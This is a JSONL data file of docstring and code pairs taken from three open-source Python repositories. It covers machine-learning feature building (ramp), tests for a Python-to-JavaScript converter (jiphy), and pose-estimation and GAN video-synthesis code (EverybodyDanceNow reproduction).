{"docstring": "\"\"\"\nA readable version of this feature (and its contained features).\nShould be as short as possible.\n\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "f = ', '.join([str(f) for f in self.features])\nif self._name:\n    return '%s(%s)' %(self._name, f)\n# else this is just a Feature wrapper, no need to add anything\nreturn f", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"\nMust provide a unique string as a funtion of this feature, its\nparameter settings, and all it's contained features. It should also be\nreadable and maintain a reasonable length (by hashing, for instance).\n\"\"\"\n", "func_signal": "def unique_name(self):\n", "code": "h = self._hash()\nreturn '%s [%s]' %(self, h)", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# this needs work...\n", "func_signal": "def __init__(self, feature, selector, target, n_keep=50, train_only=False, *args, **kwargs):\n", "code": "raise NotImplementedError\nsuper(SelectNgramCounts, self).__init__(feature, *args, **kwargs)\nself.selector = selector\nself.n_keep = n_keep\nself.target = target\nself.train_only = train_only\n# TODO: is cacheability chained through features properly?\nself._cacheable = not train_only \nself._name = self._name + '_%d_%s'%(n_keep, selector.__class__.__name__)", "path": "ramp\\features\\text.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# check for dupes\n", "func_signal": "def build_featureset_safe(features, data, prep_index=None, train_index=None):\n", "code": "colnames = set([f.unique_name for f in features])\nassert len(features) == len(colnames), \"Duplicate feature: %s\" % colnames\nif not features:\n    return\nlogging.info(\"Building %d features... \" % len(features))\nfeature_datas = []\nfitted_features = []\nfor feature in features:\n    d, ff = build_feature_safe(feature, data, prep_index, train_index)\n    feature_datas.append(d)\n    fitted_features.append(ff)\nlogging.info(\"Done building features\")\nreturn concat(feature_datas, axis=1), fitted_features", "path": "ramp\\builders.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"\nbinary: If True, predict returns only the probability\n    for the positive class. If False, returns probabilities for\n    all classes.\n\"\"\"\n", "func_signal": "def __init__(self, estimator, binary=False):\n", "code": "self.binary = binary\nsuper(Probabilities, self).__init__(estimator)", "path": "ramp\\estimators\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "# shallow copy dict and keep references\n", "func_signal": "def __getstate__(self):\n", "code": "dct = self.__dict__.copy()\nreturn dct", "path": "ramp\\features\\base.py", "repo_name": "kvh/ramp", "stars": 653, "license": "mit", "language": "python", "size": 734}
{"docstring": "\"\"\"Test to ensure multi line strings work as expected\"\"\"\n", "func_signal": "def test_multi_line_string():\n", "code": "two_way_conversion_test(\"print('''line one\\n\"\n                        \"         line two''')\\n\",\n                        \"console.log('line one\\\\n' +\\n\"\n                        \"'         line two');\\n\",\n                        \"print('line one\\\\n' +\\n\"\n                        \"'         line two')\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure that for loops will convert correctly\"\"\"\n", "func_signal": "def test_for_loop():\n", "code": "two_way_conversion_test(\"for var x = 0; x < 10; x++:\\n\"\n                        \"    var y = x\\n\"\n                        \"\\n\",\n                        \"for (var x = 0; x < 10; x++) {\\n\"\n                        \"    var y = x;\\n\"\n                        \"}\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure decorators get converted in the expected way\"\"\"\n", "func_signal": "def test_decorator():\n", "code": "two_way_conversion_test(\"@decorate\\n\"\n                        \"def my_action(arguments):\\n\"\n                        \"   do_something()\\n\"\n                        \"\\n\",\n                        \"my_action = decorate(my_action);\\n\"\n                        \"function my_action(arguments) {\\n\"\n                        \"   do_something();\\n\"\n                        \"}\\n\",\n                        \"my_action = decorate(my_action)\\n\"\n                        \"def my_action(arguments):\\n\"\n                        \"   do_something()\\n\"\n                        \"\\n\",\n                        )", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure assigning a function works as expected\"\"\"\n", "func_signal": "def test_assigned_function():\n", "code": "two_way_conversion_test(\"exports.schema = def(argument1, argument2):\\n\"\n                        \"  print(argument1)\\n\"\n                        \"\\n\",\n                        \"exports.schema = function(argument1, argument2) {\\n\"\n                        \"  console.log(argument1);\\n\"\n                        \"};\\n\")\ntwo_way_conversion_test(\"exports.schema = def(argument1, argument2):\\n\"\n                        \"  print(argument1)\\n\"\n                        \"\\n\",\n                        \"exports.schema = function(argument1, argument2) {\\n\"\n                        \"  console.log(argument1);\\n\"\n                        \"};\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure elif works as expected\"\"\"\n", "func_signal": "def test_elif():\n", "code": "two_way_conversion_test(\"if x == y:\\n\"\n                        \"    print('one')\\n\"\n                        \"elif True:\\n\"\n                        \"    print('two')\\n\"\n                        \"\\n\",\n                        \"if (x == y) {\\n\"\n                        \"    console.log('one');\\n\"\n                        \"} else if (true) {\\n\"\n                        \"    console.log('two');\\n\"\n                        \"}\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure pass is correctly converted\"\"\"\n", "func_signal": "def test_pass():\n", "code": "two_way_conversion_test(\"if x:\\n\"\n                        \"    pass\\n\"\n                        \"\\n\"\n                        \"\\n\",\n                        \"if (x) {\\n\"\n                        \"    \\n\"\n                        \"\\n\"\n                        \"}\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests to ensure that converting Javascript require statements to Python imports works in a Jiphy.\"\"\"\n", "func_signal": "def test_noop_function_conversion():\n", "code": "two_way_conversion_test((\"def my_function(): pass\\n\"),\n                        (\"function my_function() {}\\n\"))", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure comments will work as expected\"\"\"\n", "func_signal": "def test_comments():\n", "code": "two_way_conversion_test('\"\"\"Test comment\\n'\n                        '    line two\\n'\n                        '\"\"\"\\n',\n                        '/* Test comment\\n'\n                        '    line two\\n'\n                        ' */\\n')\ntwo_way_conversion_test(\"# comment\\n\",\n                        \"// comment\\n\")\ntwo_way_conversion_test('\"\"\"\"\\n'\n                        '    Test Comment\\n'\n                        '\"\"\"\\n',\n                        '/**\\n'\n                        '    Test Comment\\n'\n                        ' */\\n')", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests that the given Python_code will turn into the specified JavaScript and visa versa in a Jiphy.\n   Additionaly, ensures that if the python code is passed into the python converter it stays as Python\n   and if the given JavaScript code is passed into the javascript converter they get return unmodified\n\"\"\"\n", "func_signal": "def two_way_conversion_test(python_code, javascript_code, expect_python=None, expect_javascript=None):\n", "code": "expect_javascript = expect_javascript or javascript_code\nexpect_python = expect_python or python_code\n\nassert jiphy.to.javascript(python_code) == expect_javascript\nprint(repr(jiphy.to.python(javascript_code)))\nassert jiphy.to.python(javascript_code) == expect_python\n\nassert jiphy.to.javascript(javascript_code) == javascript_code\nassert jiphy.to.python(python_code) == python_code", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure strings get converted in the expected way\"\"\"\n", "func_signal": "def test_str():\n", "code": "two_way_conversion_test(\"x = str(1)\\n\",\n                        \"x = String(1);\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure booleans get converted in the expected way\"\"\"\n", "func_signal": "def test_bool():\n", "code": "two_way_conversion_test(\"z = bool(1)\\n\",\n                        \"z = Boolean(1);\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to nesure not statements are correct handled in a jiphy\"\"\"\n", "func_signal": "def test_not():\n", "code": "two_way_conversion_test(\"True is not True\\n\"\n                        \"True = not True\\n\",\n                        \"true !== true;\\n\"\n                        \"true = !true;\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests to ensure append/push get converted in desired mannor\"\"\"\n", "func_signal": "def test_raise_conversion():\n", "code": "two_way_conversion_test(\"raise 'error'\\n\",\n                        \"throw 'error';\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests to ensure boolean statements have a simple convesion applied to them in a jiphy\"\"\"\n", "func_signal": "def boolean_test():\n", "code": "two_way_conversion_test(\"a = (True and False) or (None and Unset)\\n\",\n                        \"a = (true && false) or (null and undefined);\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests to ensure that converting Javascript require statements to Python imports works in a Jiphy.\"\"\"\n", "func_signal": "def test_simple_indented_function_conversion():\n", "code": "two_way_conversion_test(\"def my_function(test):\\n\"\n                        \"    some_other_function(test)\\n\"\n                        \"\\n\",\n                        \"function my_function(test) {\\n\"\n                        \"    some_other_function(test);\\n\"\n                        \"}\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure assigning a function works as expected\"\"\"\n", "func_signal": "def test_magic_function():\n", "code": "two_way_conversion_test(\"=def schema(argument1, argument2):\\n\"\n                        \"  print(argument1)\\n\"\n                        \"\\n\",\n                        \"module.exports.schema = function(argument1, argument2) {\\n\"\n                        \"  console.log(argument1);\\n\"\n                        \"};\\n\",\n                        \"module.exports.schema = def(argument1, argument2):\\n\"\n                        \"  print(argument1)\\n\"\n                        \"\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure ints get converted in the expected way\"\"\"\n", "func_signal": "def test_int():\n", "code": "two_way_conversion_test(\"y = int('1')\\n\",\n                        \"y = Number('1');\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Tests to ensure that converting Python imports to JavaScript imports and vice versa works in a Jiphy.\"\"\"\n", "func_signal": "def test_import_conversion():\n", "code": "two_way_conversion_test(\"import something\\n\"\n                        \"import underscore as _\\n\",\n                        \"var something = require('something');\\n\"\n                        \"var _ = require('underscore');\\n\",\n                        \"var something = require('something')\\n\"\n                        \"var _ = require('underscore')\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure basic while loop gets converted in a jiphy\"\"\"\n", "func_signal": "def test_condition():\n", "code": "two_way_conversion_test(\"if something is True:\\n\"\n                        \"    do_something()\\n\"\n                        \"\\n\",\n                        \"if (something === true) {\\n\"\n                        \"    do_something();\\n\"\n                        \"}\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "\"\"\"Test to ensure === gets changed to is in a jiphy\"\"\"\n", "func_signal": "def test_is():\n", "code": "two_way_conversion_test(\"True is True\\n\",\n                        \"true === true;\\n\")", "path": "test_jiphy.py", "repo_name": "timothycrosley/jiphy", "stars": 571, "license": "mit", "language": "python", "size": 141}
{"docstring": "# 20180924: smaller network.\n", "func_signal": "def load_models(directory, batch_num):\n", "code": "generator = model.GlobalGenerator(n_downsampling=2, n_blocks=6)\ndiscriminator = model.NLayerDiscriminator(input_nc=3, n_layers=3)  # 48 input\ngen_name = os.path.join(directory, '%05d_generator.pth' % batch_num)\ndis_name = os.path.join(directory, '%05d_discriminator.pth' % batch_num)\n\nif os.path.isfile(gen_name) and os.path.isfile(dis_name):\n    gen_dict = torch.load(gen_name)\n    dis_dict = torch.load(dis_name)\n    generator.load_state_dict(gen_dict)\n    discriminator.load_state_dict(dis_dict)\n    print('Models loaded, resume training from batch %05d...' % batch_num)\nelse:\n    print('Cannot find saved models, start training from scratch...')\n    batch_num = 0\n\nreturn generator, discriminator, batch_num", "path": "face_enhancer\\main.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "'''\nMS COCO annotation order:\n0: nose\t   \t\t1: l eye\t\t2: r eye\t3: l ear\t4: r ear\n5: l shoulder\t6: r shoulder\t7: l elbow\t8: r elbow\n9: l wrist\t\t10: r wrist\t\t11: l hip\t12: r hip\t13: l knee\n14: r knee\t\t15: l ankle\t\t16: r ankle\n\nThe order in this work:\n(0-'nose'\t1-'neck' 2-'right_shoulder' 3-'right_elbow' 4-'right_wrist'\n5-'left_shoulder' 6-'left_elbow'\t    7-'left_wrist'  8-'right_hip'\n9-'right_knee'\t 10-'right_ankle'\t11-'left_hip'   12-'left_knee'\n13-'left_ankle'\t 14-'right_eye'\t    15-'left_eye'   16-'right_ear'\n17-'left_ear' )\n'''\n", "func_signal": "def add_neck(self, meta):\n", "code": "our_order = [0, 17, 6, 8, 10, 5, 7, 9,\n             12, 14, 16, 11, 13, 15, 2, 1, 4, 3]\n# Index 6 is right shoulder and Index 5 is left shoulder\nright_shoulder = meta['joint_self'][6, :]\nleft_shoulder = meta['joint_self'][5, :]\nneck = (right_shoulder + left_shoulder) / 2\nif right_shoulder[2] == 2 or left_shoulder[2] == 2:\n    neck[2] = 2\nelif right_shoulder[2] == 1 or left_shoulder[2] == 1:\n    neck[2] = 1\nelse:\n    neck[2] = right_shoulder[2] * left_shoulder[2]\n\nneck = neck.reshape(1, len(neck))\nneck = np.round(neck)\nmeta['joint_self'] = np.vstack((meta['joint_self'], neck))\nmeta['joint_self'] = meta['joint_self'][our_order, :]\ntemp = []\n\nfor i in range(meta['numOtherPeople']):\n    right_shoulder = meta['joint_others'][i, 6, :]\n    left_shoulder = meta['joint_others'][i, 5, :]\n    neck = (right_shoulder + left_shoulder) / 2\n    if (right_shoulder[2] == 2 or left_shoulder[2] == 2):\n        neck[2] = 2\n    elif (right_shoulder[2] == 1 or left_shoulder[2] == 1):\n        neck[2] = 1\n    else:\n        neck[2] = right_shoulder[2] * left_shoulder[2]\n    neck = neck.reshape(1, len(neck))\n    neck = np.round(neck)\n    single_p = np.vstack((meta['joint_others'][i], neck))\n    single_p = single_p[our_order, :]\n    temp.append(single_p)\nmeta['joint_others'] = np.array(temp)\n\nreturn meta", "path": "src\\PoseEstimation\\training\\datasets\\coco_data\\COCO_data_pipeline.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nReturn a generate that can yield endless data.\n:Example:\nstream = get_stream()\nfor i in range(100):\n    batch = next(stream)\n\n:return: stream\n:rtype: Generator\n\"\"\"\n", "func_signal": "def get_stream(self):\n", "code": "while True:\n    for data in iter(self):\n        yield data", "path": "src\\PoseEstimation\\training\\datasets\\dataloader.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# Bottom-up approach:\n# Step 1: find all joints in the image (organized by joint type: [0]=nose,\n# [1]=neck...)\n", "func_signal": "def decode_pose(img_orig, param, heatmaps, pafs):\n", "code": "joint_list_per_joint_type = NMS(param,\n                                heatmaps, img_orig.shape[0] / float(heatmaps.shape[0]))\n# joint_list is an unravel'd version of joint_list_per_joint, where we add\n# a 5th column to indicate the joint_type (0=nose, 1=neck...)\njoint_list = np.array([tuple(peak) + (joint_type,) for joint_type,\n                       joint_peaks in enumerate(joint_list_per_joint_type) for peak in joint_peaks])\n\n# Step 2: find which joints go together to form limbs (which wrists go\n# with which elbows)\npaf_upsamp = cv2.resize(\n    pafs, (img_orig.shape[1], img_orig.shape[0]), interpolation=cv2.INTER_CUBIC)\nconnected_limbs = find_connected_joints(param,\n                                        paf_upsamp, joint_list_per_joint_type)\n\n# Step 3: associate limbs that belong to the same person\nperson_to_joint_assoc = group_limbs_of_same_person(\n    connected_limbs, joint_list)\n\n# (Step 4): plot results\nto_plot, canvas = plot_pose(img_orig, joint_list, person_to_joint_assoc)\n\nreturn to_plot, canvas, joint_list, person_to_joint_assoc", "path": "src\\PoseEstimation\\network\\post.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nFor every type of limb (eg: forearm, shin, etc.), look for every potential\npair of joints (eg: every wrist-elbow combination) and evaluate the PAFs to\ndetermine which pairs are indeed body limbs.\n:param paf_upsamp: PAFs upsampled to the original input image resolution\n:param joint_list_per_joint_type: See 'return' doc of NMS()\n:param num_intermed_pts: Int indicating how many intermediate points to take\nbetween joint_src and joint_dst, at which the PAFs will be evaluated\n:return: List of NUM_LIMBS rows. For every limb_type (a row) we store\na list of all limbs of that type found (eg: all the right forearms).\nFor each limb (each item in connected_limbs[limb_type]), we store 5 cells:\n# {joint_src_id,joint_dst_id}: a unique number associated with each joint,\n# limb_score_penalizing_long_dist: a score of how good a connection\nof the joints is, penalized if the limb length is too long\n# {joint_src_index,joint_dst_index}: the index of the joint within\nall the joints of that type found (eg: the 3rd right elbow found)\n\"\"\"\n", "func_signal": "def find_connected_joints(param, paf_upsamp, joint_list_per_joint_type, num_intermed_pts=10):\n", "code": "connected_limbs = []\n\n# Auxiliary array to access paf_upsamp quickly\nlimb_intermed_coords = np.empty((4, num_intermed_pts), dtype=np.intp)\nfor limb_type in range(NUM_LIMBS):\n    # List of all joints of type A found, where A is specified by limb_type\n    # (eg: a right forearm starts in a right elbow)\n    joints_src = joint_list_per_joint_type[joint_to_limb_heatmap_relationship[limb_type][0]]\n    # List of all joints of type B found, where B is specified by limb_type\n    # (eg: a right forearm ends in a right wrist)\n    joints_dst = joint_list_per_joint_type[joint_to_limb_heatmap_relationship[limb_type][1]]\n    if len(joints_src) == 0 or len(joints_dst) == 0:\n        # No limbs of this type found (eg: no right forearms found because\n        # we didn't find any right wrists or right elbows)\n        connected_limbs.append([])\n    else:\n        connection_candidates = []\n        # Specify the paf index that contains the x-coord of the paf for\n        # this limb\n        limb_intermed_coords[2, :] = paf_xy_coords_per_limb[limb_type][0]\n        # And the y-coord paf index\n        limb_intermed_coords[3, :] = paf_xy_coords_per_limb[limb_type][1]\n        for i, joint_src in enumerate(joints_src):\n            # Try every possible joints_src[i]-joints_dst[j] pair and see\n            # if it's a feasible limb\n            for j, joint_dst in enumerate(joints_dst):\n                # Subtract the position of both joints to obtain the\n                # direction of the potential limb\n                limb_dir = joint_dst[:2] - joint_src[:2]\n                # Compute the distance/length of the potential limb (norm\n                # of limb_dir)\n                limb_dist = np.sqrt(np.sum(limb_dir**2)) + 1e-8\n                limb_dir = limb_dir / limb_dist  # Normalize limb_dir to be a unit vector\n\n                # Linearly distribute num_intermed_pts points from the x\n                # coordinate of joint_src to the x coordinate of joint_dst\n                limb_intermed_coords[1, :] = np.round(np.linspace(\n                    joint_src[0], joint_dst[0], num=num_intermed_pts))\n                limb_intermed_coords[0, :] = np.round(np.linspace(\n                    joint_src[1], joint_dst[1], num=num_intermed_pts))  # Same for the y coordinate\n                intermed_paf = paf_upsamp[limb_intermed_coords[0, :],\n                                          limb_intermed_coords[1, :], limb_intermed_coords[2:4, :]].T\n\n                score_intermed_pts = intermed_paf.dot(limb_dir)\n                score_penalizing_long_dist = score_intermed_pts.mean(\n                ) + min(0.5 * paf_upsamp.shape[0] / limb_dist - 1, 0)\n                # Criterion 1: At least 80% of the intermediate points have\n                # a score higher than thre2\n                criterion1 = (np.count_nonzero(\n                    score_intermed_pts > param['thre2']) > 0.8 * num_intermed_pts)\n                # Criterion 2: Mean score, penalized for large limb\n                # distances (larger than half the image height), is\n                # positive\n                criterion2 = (score_penalizing_long_dist > 0)\n                if criterion1 and criterion2:\n                    # Last value is the combined paf(+limb_dist) + heatmap\n                    # scores of both joints\n                    connection_candidates.append(\n                        [i, j, score_penalizing_long_dist, score_penalizing_long_dist + joint_src[2] + joint_dst[2]])\n\n        # Sort connection candidates based on their\n        # score_penalizing_long_dist\n        connection_candidates = sorted(\n            connection_candidates, key=lambda x: x[2], reverse=True)\n        connections = np.empty((0, 5))\n        # There can only be as many limbs as the smallest number of source\n        # or destination joints (eg: only 2 forearms if there's 5 wrists\n        # but 2 elbows)\n        max_connections = min(len(joints_src), len(joints_dst))\n        # Traverse all potential joint connections (sorted by their score)\n        for potential_connection in connection_candidates:\n            i, j, s = potential_connection[0:3]\n            # Make sure joints_src[i] or joints_dst[j] haven't already been\n            # connected to other joints_dst or joints_src\n            if i not in connections[:, 3] and j not in connections[:, 4]:\n                # [joint_src_id, joint_dst_id, limb_score_penalizing_long_dist, joint_src_index, joint_dst_index]\n                connections = np.vstack(\n                    [connections, [joints_src[i][3], joints_dst[j][3], s, i, j]])\n                # Exit if we've already established max_connections\n                # connections (each joint can't be connected to more than\n                # one joint)\n                if len(connections) >= max_connections:\n                    break\n        connected_limbs.append(connections)\n\nreturn connected_limbs", "path": "src\\PoseEstimation\\network\\post.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# t = [np.random.uniform()]\n# t += [np.random.uniform()]\n# t += [np.random.uniform()]\n# t = np.array(t) * 2. - 1.\n", "func_signal": "def imcv2_recolor(im, a=.1):\n", "code": "t = np.random.uniform(-1, 1, 3)\n\n# random amplify each channel\nim = im.astype(np.float)\nim *= (1 + t * a)\nmx = 255. * (1 + a)\nup = np.random.uniform(-1, 1)\nim = np.power(im / mx, 1. + up * .5)\n# return np.array(im * 255., np.uint8)\nreturn im", "path": "src\\PoseEstimation\\network\\im_transform.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# configs\n", "func_signal": "def main(is_debug):\n", "code": "import os\n\ndataset_dir = '../data/face'\npose_name = '../data/target/pose.npy'\nckpt_dir = '../checkpoints/face'\nlog_dir = '../checkpoints/face/logs'\nbatch_num = 10\nbatch_size = 10\n\nimage_folder = dataset.ImageFolderDataset(dataset_dir, cache=os.path.join(dataset_dir, 'local.db'))\nface_dataset = dataset.FaceCropDataset(image_folder, pose_name, image_transforms, crop_size=48)  # 48 for 512-frame, 96 for HD frame\ndata_loader = DataLoader(face_dataset, batch_size=batch_size,\n                         drop_last=True, num_workers=4, shuffle=True)\n\ngenerator, discriminator, batch_num = load_models(ckpt_dir, batch_num)\n\nif is_debug:\n    trainer = Trainer(ckpt_dir, log_dir, face_dataset, data_loader, log_every=1, save_every=1)\nelse:\n    trainer = Trainer(ckpt_dir, log_dir, face_dataset, data_loader)\ntrainer.train(generator, discriminator, batch_num)", "path": "face_enhancer\\main.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# Encode Inputs\n", "func_signal": "def forward(self, label, inst, image, feat, infer=False):\n", "code": "input_label, inst_map, real_image, feat_map = self.encode_input(label, inst, image, feat)  \n\n# Fake Generation\nif self.use_features:\n    if not self.opt.load_features:\n        feat_map = self.netE.forward(real_image, inst_map)                     \n    input_concat = torch.cat((input_label, feat_map), dim=1)                        \nelse:\n    input_concat = input_label\n# TODO----------------------#    \nfake_image = self.netG.forward(input_concat.float())\n\n# Fake Detection and Loss\npred_fake_pool = self.discriminate(input_label, fake_image, use_pool=True)\nloss_D_fake = self.criterionGAN(pred_fake_pool, False)        \n\n# Real Detection and Loss        \npred_real = self.discriminate(input_label, real_image)\nloss_D_real = self.criterionGAN(pred_real, True)\n\n# GAN loss (Fake Passability Loss)        \npred_fake = self.netD.forward(torch.cat((input_label, fake_image), dim=1))        \nloss_G_GAN = self.criterionGAN(pred_fake, True)               \n\n# GAN feature matching loss\nloss_G_GAN_Feat = 0\nif not self.opt.no_ganFeat_loss:\n    feat_weights = 4.0 / (self.opt.n_layers_D + 1)\n    D_weights = 1.0 / self.opt.num_D\n    for i in range(self.opt.num_D):\n        for j in range(len(pred_fake[i])-1):\n            loss_G_GAN_Feat += D_weights * feat_weights * \\\n                self.criterionFeat(pred_fake[i][j], pred_real[i][j].detach()) * self.opt.lambda_feat\n           \n# VGG feature matching loss\nloss_G_VGG = 0\nif not self.opt.no_vgg_loss:\n    loss_G_VGG = self.criterionVGG(fake_image, real_image) * self.opt.lambda_feat\n\n# Only return the fake_B image if necessary to save BW\nreturn [ self.loss_filter( loss_G_GAN, loss_G_GAN_Feat, loss_G_VGG, loss_D_real, loss_D_fake ), None if not infer else fake_image ]", "path": "src\\pix2pixHD\\models\\pix2pixHD_model.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# Encode Inputs        \n", "func_signal": "def inference(self, label, inst):\n", "code": "input_label, inst_map, _, _ = self.encode_input(Variable(label), Variable(inst), infer=True)\n\n# Fake Generation\nif self.use_features:       \n    # sample clusters from precomputed features             \n    feat_map = self.sample_features(inst_map)\n    input_concat = torch.cat((input_label, feat_map), dim=1)                        \nelse:\n    input_concat = input_label        \n   \nif torch.__version__.startswith('0.4'):\n    with torch.no_grad():\n        fake_image = self.netG.forward(input_concat)\nelse:\n    fake_image = self.netG.forward(input_concat)\nreturn fake_image", "path": "src\\pix2pixHD\\models\\pix2pixHD_model.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# skip over bad items\n", "func_signal": "def get_full_sample(self, item):\n", "code": "while True:\n    real_img, fake_img = self.image_dataset[item]\n    head_pos = self.poses[item]\n    if head_pos[0] == -1 or head_pos[1] == -1:\n        item = (item + 1) % len(self.image_dataset)\n    else:\n        break\n\n# crop head image\nsize = self.image_dataset.size\nleft = int(head_pos[0] - self.crop_size / 2)  # don't suppose left will go out of bound eh?\nleft = left if left >= 0 else 0\nleft = size[1] - self.crop_size if left + self.crop_size > size[1] else left\n\ntop = int(head_pos[1] - self.crop_size / 2)\ntop = top if top >= 0 else 0\ntop = size[0] - self.crop_size if top + self.crop_size > size[0] else top\n\n\nreal_head = None if self.image_dataset.is_test else \\\n            self.transform(real_img[top: top + self.crop_size, left: left + self.crop_size,  :])\nfake_head = self.transform(fake_img[top: top + self.crop_size, left: left + self.crop_size,  :])\n\n# from matplotlib.pyplot import imshow, show\n# imshow(real_head.numpy().transpose((2,1,0)))\n# show()\n# imshow(fake_head.numpy().transpose((2,1,0)))\n# show()\n\n# keep full fake image to visualize enhancement result\nreturn real_head, fake_head, \\\n       top, top + self.crop_size, \\\n       left, left + self.crop_size, \\\n       real_img, fake_img", "path": "face_enhancer\\dataset.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# get the region of the new strokes (bw is the brush width)        \n", "func_signal": "def add_strokes(self, click_src, label_tgt, bw, save):\n", "code": "size = self.net_input.size()\nh, w = size[2], size[3]\nidx_src = torch.LongTensor(bw**2, 4).fill_(0)\nfor i in range(bw):\n    idx_src[i*bw:(i+1)*bw, 2] = min(h-1, max(0, click_src[0]-bw//2 + i))\n    for j in range(bw):\n        idx_src[i*bw+j, 3] = min(w-1, max(0, click_src[1]-bw//2 + j))\nidx_src = idx_src.cuda()\n\n# again, need to update 3 things\nif idx_src.shape:\n    # backup current maps\n    if save:\n        self.backup_current_state()\n\n    # update the label map (and the network input) in the stroke region            \n    self.label_map[idx_src[:,0], idx_src[:,1], idx_src[:,2], idx_src[:,3]] = label_tgt\n    for k in range(self.opt.label_nc):\n        self.net_input[idx_src[:,0], idx_src[:,1] + k, idx_src[:,2], idx_src[:,3]] = 0\n    self.net_input[idx_src[:,0], idx_src[:,1] + label_tgt, idx_src[:,2], idx_src[:,3]] = 1                 \n\n    # update the instance map (and the network input)\n    self.inst_map[idx_src[:,0], idx_src[:,1], idx_src[:,2], idx_src[:,3]] = label_tgt\n    self.net_input[:,-1,:,:] = self.get_edges(self.inst_map)\n    \n    # also update the features if available\n    if self.opt.instance_feat:                                            \n        feat = self.features_clustered[label_tgt]\n        #np.random.seed(label_tgt+1)   \n        #cluster_idx = np.random.randint(0, feat.shape[0])\n        cluster_idx = self.cluster_indices[label_tgt]\n        self.set_features(idx_src, feat, cluster_idx)                                                  \n\nself.fake_image = util.tensor2im(self.single_forward(self.net_input, self.feat_map))", "path": "src\\pix2pixHD\\models\\ui_model.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
